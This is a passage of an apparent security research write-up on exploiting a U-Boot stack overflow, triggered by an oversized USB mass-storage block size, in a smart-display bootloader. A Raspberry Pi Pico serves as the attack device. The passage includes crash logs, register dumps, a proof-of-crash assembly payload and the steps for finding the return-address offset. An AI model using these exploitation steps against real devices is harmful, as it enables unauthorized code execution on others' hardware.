    &lt;span class="cp"&gt;#12 0x420919 in _start (/u-boot-elaine/fuzzer/fuzz+0x420919)&lt;/span&gt;

&lt;span class="n"&gt;Address&lt;/span&gt; &lt;span class="mh"&gt;0x7ffe6db4bb3f&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;located&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;stack&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="kr"&gt;thread&lt;/span&gt; &lt;span class="n"&gt;T0&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="mi"&gt;607&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;frame&lt;/span&gt;
    &lt;span class="cp"&gt;#0 0x5282ff in part_test_dos /u-boot-elaine/disk/part_dos.c:90&lt;/span&gt;

  &lt;span class="n"&gt;This&lt;/span&gt; &lt;span class="n"&gt;frame&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
    &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;607&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;__mbr&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="mi"&gt;92&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;==&lt;/span&gt; &lt;span class="n"&gt;Memory&lt;/span&gt; &lt;span class="n"&gt;access&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="mi"&gt;607&lt;/span&gt; &lt;span class="n"&gt;overflows&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt; &lt;span class="n"&gt;variable&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;AddressSanitizer detected a stack buffer overflow in &lt;strong&gt;part_test_dos&lt;/strong&gt;. This function is called to detect a DOS partition table when an USB Mass Storage device is connected.&lt;/p&gt;
&lt;p&gt;It is interesting to note that, while the crash occurs in DOS partition layer, the invalid size at the origin of the crash is set by the USB Mass Storage layer. This suggests that it is unlikely to find this bug if layers are fuzzed independently.&lt;/p&gt;
&lt;h2&gt;U-Boot stack overflow&lt;/h2&gt;
&lt;p&gt;The crash is caused by a simple bug in function &lt;strong&gt;part_test_dos&lt;/strong&gt; :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;part_test_dos&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;blk_desc&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;dev_desc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;    &lt;span class="n"&gt;ALLOC_CACHE_ALIGN_BUFFER&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;legacy_mbr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mbr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;blk_dread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dev_desc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ulong&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;mbr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ol&gt;
&lt;li&gt;Buffer &lt;em&gt;mbr&lt;/em&gt; of 512 bytes (&lt;strong&gt;sizeof&lt;/strong&gt;(&lt;em&gt;legacy_mbr&lt;/em&gt;)) is allocated on the stack.&lt;/li&gt;
&lt;li&gt;Function &lt;strong&gt;blk_dread&lt;/strong&gt; reads 1 block at address 0 from block device &lt;em&gt;dev_desc&lt;/em&gt; and writes data to buffer &lt;em&gt;mbr&lt;/em&gt;. &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If block size (&lt;em&gt;dev_desc-&amp;gt;blksz&lt;/em&gt;) is larger than 512, function &lt;strong&gt;blk_dread&lt;/strong&gt; overflows buffer &lt;em&gt;mbr&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;As said before, block size can be controlled by attacker. But in practice, most USB flash drives have a block size of 512 bytes, and it cannot be customized easily. Let's build one instead.&lt;/p&gt;
&lt;h1&gt;3. Exploitation device : CHIPICOPWN&lt;/h1&gt;
&lt;p&gt;In order to exploit this bug in the Nest Hub bootloader, we need an USB Mass Storage device that supports larger-than-usual block size. One solution could be based on the &lt;a href="https://www.kernel.org/doc/html/latest/usb/mass-storage.html"&gt;Mass Storage Gadget from Linux USB Gadget framework&lt;/a&gt; with an USB OTG-enabled host (e.g. &lt;a href="https://www.khadas.com/vim3l"&gt;VIM3L SBC&lt;/a&gt; we used to &lt;a href="https://fredericb.info/2021/02/dump-amlogic-s905d3-bootrom-from-khadas-vim3l-board.html"&gt;dump the S905D3 bootROM&lt;/a&gt;. But there's a cheaper option.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.raspberrypi.com/products/raspberry-pi-pico/"&gt;Raspberry Pi Pico&lt;/a&gt; is a $4 microcontroller with USB Device support. It also has the great advantage of being supported by &lt;a href="https://github.com/hathach/tinyusb"&gt;TinyUSB, an open-source cross-platform USB Host/Device stack&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Raspberry Pi Pico board" src="https://fredericb.info/blog/elaine/rpi-pico-board-front.png" style="display: block;margin-left: auto;margin-right: auto;" width="600px"&gt;&lt;/p&gt;
&lt;p&gt;TinyUSB project provides a &lt;a href="https://github.com/hathach/tinyusb/tree/master/examples/device/cdc_msc"&gt;Mass Storage device example code&lt;/a&gt; that can turn a Raspberry Pi Pico into a customizable USB flash drive. From this starting point, we can build an exploitation device that will :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;inject payload into stack memory&lt;/li&gt;
&lt;li&gt;overwrite return address to execute payload&lt;/li&gt;
&lt;li&gt;display a cool logo&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;However, due to the &lt;em&gt;black-box&lt;/em&gt; approach (no access to firmware), we still miss important information to develop the exploit. We'll go through several steps to collect all the information required to craft our final payload.&lt;/p&gt;
&lt;h2&gt;3.1 Proof-of-Crash&lt;/h2&gt;
&lt;p&gt;We start by verifying if the device is actually vulnerable to the bug. Using the &lt;a href="https://github.com/hathach/tinyusb/tree/4bfab30c02279a0530e1a56f4a7c539f2d35a293/examples/device/cdc_msc"&gt;Mass Storage device example code&lt;/a&gt; as starting point, we &lt;a href="https://github.com/frederic/chipicopwn/commit/c576f382b6ada027aab592ede525db1405f79cf4"&gt;change the block size to 1024 instead of 512&lt;/a&gt; to confirm if we observe a crash.&lt;/p&gt;
&lt;p&gt;When connected to our host, the Raspberry Pi Pico is now detected as Mass Storage with &lt;em&gt;"1024-byte logical blocks"&lt;/em&gt; :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;usb &lt;span class="m"&gt;1&lt;/span&gt;-2: New USB device found, &lt;span class="nv"&gt;idVendor&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;cafe, &lt;span class="nv"&gt;idProduct&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4003&lt;/span&gt;, &lt;span class="nv"&gt;bcdDevice&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;.00
usb &lt;span class="m"&gt;1&lt;/span&gt;-2: New USB device strings: &lt;span class="nv"&gt;Mfr&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;, &lt;span class="nv"&gt;Product&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;, &lt;span class="nv"&gt;SerialNumber&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;
usb &lt;span class="m"&gt;1&lt;/span&gt;-2: Product: TinyUSB Device
usb &lt;span class="m"&gt;1&lt;/span&gt;-2: Manufacturer: TinyUSB
usb &lt;span class="m"&gt;1&lt;/span&gt;-2: SerialNumber: &lt;span class="m"&gt;123456789012&lt;/span&gt;
usb-storage &lt;span class="m"&gt;1&lt;/span&gt;-2:1.0: USB Mass Storage device detected
scsi host0: usb-storage &lt;span class="m"&gt;1&lt;/span&gt;-2:1.0
scsi host0: scsi scan: INQUIRY result too short &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, using &lt;span class="m"&gt;36&lt;/span&gt;
scsi &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: Direct-Access     TinyUSB  Mass Storage     &lt;span class="m"&gt;1&lt;/span&gt;.0  PQ: &lt;span class="m"&gt;0&lt;/span&gt; ANSI: &lt;span class="m"&gt;2&lt;/span&gt;
sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: Attached scsi generic sg0 &lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: &lt;span class="o"&gt;[&lt;/span&gt;sda&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt; &lt;span class="m"&gt;1024&lt;/span&gt;-byte logical blocks: &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;16&lt;/span&gt;.4 kB/16.0 KiB&lt;span class="o"&gt;)&lt;/span&gt;
sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: &lt;span class="o"&gt;[&lt;/span&gt;sda&lt;span class="o"&gt;]&lt;/span&gt; Write Protect is off
sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: &lt;span class="o"&gt;[&lt;/span&gt;sda&lt;span class="o"&gt;]&lt;/span&gt; Mode Sense: &lt;span class="m"&gt;03&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt;
sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: &lt;span class="o"&gt;[&lt;/span&gt;sda&lt;span class="o"&gt;]&lt;/span&gt; No Caching mode page found
sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: &lt;span class="o"&gt;[&lt;/span&gt;sda&lt;span class="o"&gt;]&lt;/span&gt; Assuming drive cache: write through
 sda:
sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: &lt;span class="o"&gt;[&lt;/span&gt;sda&lt;span class="o"&gt;]&lt;/span&gt; Attached SCSI removable disk
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When connected to the device booted in recovery mode, the Pico causes an exception, and registers are dumped over UART :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Synchronous Abort&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;esr&lt;/span&gt; &lt;span class="mh"&gt;0x02000000&lt;/span&gt;
&lt;span class="nl"&gt;elr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ffffffff8110e000&lt;/span&gt; &lt;span class="nl"&gt;lr&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ffffffff8110e000&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;reloc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;elr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;lr&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
&lt;span class="nl"&gt;x0&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000002&lt;/span&gt; &lt;span class="nl"&gt;x1&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
&lt;span class="nl"&gt;x2&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;x3&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
&lt;span class="nl"&gt;x4&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5b00&lt;/span&gt; &lt;span class="nl"&gt;x5&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffffffffffff8&lt;/span&gt;
&lt;span class="nl"&gt;x6&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;x7&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
&lt;span class="nl"&gt;x8&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;x9&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000000&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="nl"&gt;x10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c0021b0&lt;/span&gt; &lt;span class="nl"&gt;x11&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c009b80&lt;/span&gt;
&lt;span class="nl"&gt;x12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;x13&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt;
&lt;span class="nl"&gt;x14&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5c4c&lt;/span&gt; &lt;span class="nl"&gt;x15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;00000000ff&lt;/span&gt;&lt;span class="n"&gt;ffffff&lt;/span&gt;
&lt;span class="nl"&gt;x16&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000004060&lt;/span&gt; &lt;span class="nl"&gt;x17&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;00000000000000&lt;/span&gt;&lt;span class="mi"&gt;84&lt;/span&gt;
&lt;span class="nl"&gt;x18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bee1dc8&lt;/span&gt; &lt;span class="nl"&gt;x19&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
&lt;span class="nl"&gt;x20&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;x21&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
&lt;span class="nl"&gt;x22&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000002&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="nl"&gt;x23&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c008490&lt;/span&gt;
&lt;span class="nl"&gt;x24&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c008490&lt;/span&gt; &lt;span class="nl"&gt;x25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;000000007ff&lt;/span&gt;&lt;span class="n"&gt;dcd80&lt;/span&gt;
&lt;span class="nl"&gt;x26&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;x27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
&lt;span class="nl"&gt;x28&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c009ac0&lt;/span&gt; &lt;span class="nl"&gt;x29&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;

&lt;span class="n"&gt;Resetting&lt;/span&gt; &lt;span class="n"&gt;CPU&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This indicates with great certainty that the device is vulnerable to our bug. Register values will be very helpful to develop the exploit. Unfortunately, &lt;em&gt;sp&lt;/em&gt; register value is missing, so we'll have to do extra work to locate our payload in the stack. Still, we have obtained the global data pointer &lt;em&gt;gd&lt;/em&gt; which is &lt;a href="https://u-boot.readthedocs.io/en/latest/develop/global_data.html"&gt;stored in register &lt;em&gt;x18&lt;/em&gt;&lt;/a&gt;. And we can learn from U-Boot source code that stack top is located below &lt;em&gt;gd&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;3.2 Offset of payload address&lt;/h2&gt;
&lt;p&gt;The bug allows to overflow a buffer on the stack to overwrite a return address. First, we look for the offset in our payload that will overwrite that return address. For that, we create a &lt;a href="https://github.com/frederic/chipicopwn/blob/main/payloads/poc_step1.S"&gt;payload filled with incremental invalid pointers&lt;/a&gt; :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="na"&gt;.text&lt;/span&gt;
&lt;span class="na"&gt;.global&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;

&lt;span class="nl"&gt;_start:&lt;/span&gt;
&lt;span class="na"&gt;.word&lt;/span&gt; &lt;span class="mi"&gt;0xFFFFFC00&lt;/span&gt;
&lt;span class="na"&gt;.word&lt;/span&gt; &lt;span class="mi"&gt;0xFFFFFC01&lt;/span&gt;
&lt;span class="na"&gt;.word&lt;/span&gt; &lt;span class="mi"&gt;0xFFFFFC02&lt;/span&gt;
&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="na"&gt;.word&lt;/span&gt; &lt;span class="mi"&gt;0xFFFFFFFF&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then, we &lt;a href="https://github.com/frederic/chipicopwn/commit/42ced2f16d4c7f64f74d6d6d13e93d85a72c8ba7"&gt;modify the Pico code&lt;/a&gt; to use this payload as the block 0 of the block device. The device crashes again :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Synchronous Abort&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;esr&lt;/span&gt; &lt;span class="mh"&gt;0x8a000000&lt;/span&gt;
&lt;span class="nl"&gt;elr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc8f8110dc8e&lt;/span&gt; &lt;span class="nl"&gt;lr&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc8f8110dc8e&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;reloc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;elr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc8ffffffc8e&lt;/span&gt; &lt;span class="nl"&gt;lr&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc8ffffffc8e&lt;/span&gt;
&lt;span class="nl"&gt;x0&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;00000000ff&lt;/span&gt;&lt;span class="n"&gt;ffffff&lt;/span&gt; &lt;span class="nl"&gt;x1&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt;
&lt;span class="nl"&gt;x2&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5888&lt;/span&gt; &lt;span class="nl"&gt;x3&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
&lt;span class="nl"&gt;x4&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000001000&lt;/span&gt; &lt;span class="nl"&gt;x5&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000200&lt;/span&gt;
&lt;span class="nl"&gt;x6&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffffffffffffe&lt;/span&gt; &lt;span class="nl"&gt;x7&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
&lt;span class="nl"&gt;x8&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;x9&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000000&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="nl"&gt;x10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c0021b0&lt;/span&gt; &lt;span class="nl"&gt;x11&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c009b80&lt;/span&gt;
&lt;span class="nl"&gt;x12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;x13&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt;
&lt;span class="nl"&gt;x14&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5c4c&lt;/span&gt; &lt;span class="nl"&gt;x15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;00000000ff&lt;/span&gt;&lt;span class="n"&gt;ffffff&lt;/span&gt;
&lt;span class="nl"&gt;x16&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000004060&lt;/span&gt; &lt;span class="nl"&gt;x17&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;00000000000000&lt;/span&gt;&lt;span class="mi"&gt;84&lt;/span&gt;
&lt;span class="nl"&gt;x18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bee1dc8&lt;/span&gt; &lt;span class="nl"&gt;x19&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc91fffffc90&lt;/span&gt;
&lt;span class="nl"&gt;x20&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc93fffffc92&lt;/span&gt; &lt;span class="nl"&gt;x21&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc95fffffc94&lt;/span&gt;
&lt;span class="nl"&gt;x22&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000002&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="nl"&gt;x23&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c008490&lt;/span&gt;
&lt;span class="nl"&gt;x24&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c008490&lt;/span&gt; &lt;span class="nl"&gt;x25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;000000007ff&lt;/span&gt;&lt;span class="n"&gt;dcd80&lt;/span&gt;
&lt;span class="nl"&gt;x26&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;x27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
&lt;span class="nl"&gt;x28&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c009ac0&lt;/span&gt; &lt;span class="nl"&gt;x29&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc8dfffffc8c&lt;/span&gt;

&lt;span class="n"&gt;Resetting&lt;/span&gt; &lt;span class="n"&gt;CPU&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can notice that the link register &lt;em&gt;lr&lt;/em&gt; contains an invalid pointer : fffffc8ffffffc8e. We recognize values 0xFFFFFC8E and 0xFFFFFC8F from our payload. This means the offset is 0x238 (0x8e * 4 bytes).&lt;/p&gt;
&lt;h2&gt;3.3 Payload address&lt;/h2&gt;
&lt;p&gt;We can now redirect code execution to an arbitrary address specified at offset 0x238 in our payload. The next step is to determine the start address of this payload to finally execute it.&lt;/p&gt;
&lt;p&gt;We create a &lt;a href="https://github.com/frederic/chipicopwn/blob/main/payloads/poc_step2.S"&gt;large payload&lt;/a&gt; (maximum allowed block size is 0x8000) filled with many branch instructions that all lead to few instructions at the very end.&lt;/p&gt;
&lt;p&gt;If we manage to guess the address of any of these 8,185 branch instructions, the payload will be executed.
And we have a major hint : we already know that stack top is located below &lt;em&gt;gd&lt;/em&gt; address (register &lt;em&gt;x18&lt;/em&gt;).&lt;/p&gt;
